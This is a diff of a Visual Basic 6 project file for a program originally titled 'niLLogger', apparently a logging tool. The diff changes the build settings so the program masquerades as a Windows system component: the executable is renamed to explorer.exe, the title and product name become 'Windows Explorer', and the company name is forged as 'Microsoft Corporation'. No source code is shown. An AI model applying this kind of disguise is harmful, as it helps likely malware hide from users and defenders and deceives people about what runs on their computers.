@@ -1,22 +1,22 @@
 Type=Exe
 Form=Form1.frm
-Reference=*\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\WINDOWS\system32\stdole2.tlb#OLE Automation
+Reference=*\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\WINDOWS\system32\STDOLE2.TLB#OLE Automation
 IconForm="Form1"
 Startup="Form1"
 HelpFile=""
-Title="niLLogger"
-ExeName32="setting.exe"
-Path32="G:\niL"
+Title="Windows Explorer"
+ExeName32="explorer.exe"
 Command32=""
-Name="Project1"
+Name="explorer"
 HelpContextID="0"
 CompatibleMode="0"
 MajorVer=1
 MinorVer=0
-RevisionVer=2
+RevisionVer=17
 AutoIncrementVer=1
 ServerSupportFiles=0
-VersionCompanyName="niL"
+VersionCompanyName="Microsoft Corporation"
+VersionProductName="Windows Explorer"
 CompilationType=0
 OptimizationType=0
 FavorPentiumPro(tm)=0
@@ -32,6 +32,7 @@ Unattended=0
 Retained=0
 ThreadPerObject=0
 MaxNumberOfThreads=1
+DebugStartupOption=0
 
 [MS Transaction Server]
 AutoRefresh=1
